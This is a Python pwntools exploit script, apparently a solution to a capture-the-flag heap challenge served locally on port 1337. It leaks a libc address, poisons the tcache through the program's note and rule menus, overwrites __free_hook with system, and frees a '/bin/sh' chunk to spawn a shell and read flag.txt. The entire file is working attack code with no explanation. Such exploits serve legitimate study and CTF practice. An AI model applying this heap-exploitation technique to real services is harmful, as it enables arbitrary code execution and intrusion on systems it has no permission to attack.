#!/usr/bin/env python3
from pwn import *

HOST = "127.0.0.1"
PORT = 1337
libc = ELF("./challenge/dist/libc-2.31.so")
io = remote(HOST, PORT)

def create_rule():
    io.sendlineafter(b"> ", b"1")
    io.sendlineafter(b"> ", b"1")

def create_note():
    io.sendlineafter(b"> ", b"1")
    io.sendlineafter(b"> ", b"2")

def delete_note(idx):
    io.sendlineafter(b"> ", b"2")
    io.sendlineafter(b"> ", b"2")
    io.sendlineafter(b"> ", str(idx).encode())

def edit_rule(idx, data):
    io.sendlineafter(b"> ", b"4")
    io.sendlineafter(b"> ", b"1")
    io.sendlineafter(b"> ", str(idx).encode())
    io.sendafter(b"> ", data.ljust(64, b"\x00"))

def edit_note(idx, data):
    io.sendlineafter(b"> ", b"4")
    io.sendlineafter(b"> ", b"2")
    io.sendlineafter(b"> ", str(idx).encode())
    io.sendafter(b"> ", data.ljust(64, b"\x00"))

def make_law():
    io.sendlineafter(b"> ", b"5")
    return int(io.recvuntil(b",", drop=True), 16)

libc_leak = make_law()
libc.address = libc_leak - 0x1ecbe0
free_hook = libc.sym["__free_hook"]
system = libc.sym["system"]

for _ in range(4):
    create_note()
delete_note(3)
delete_note(2)
delete_note(1)
delete_note(0)

create_rule()
edit_rule(0, p64(free_hook))
create_note()
create_note()
edit_note(1, p64(system))
edit_note(0, b"/bin/sh\x00")
delete_note(0)
io.sendline(b"cat flag.txt")
io.interactive()
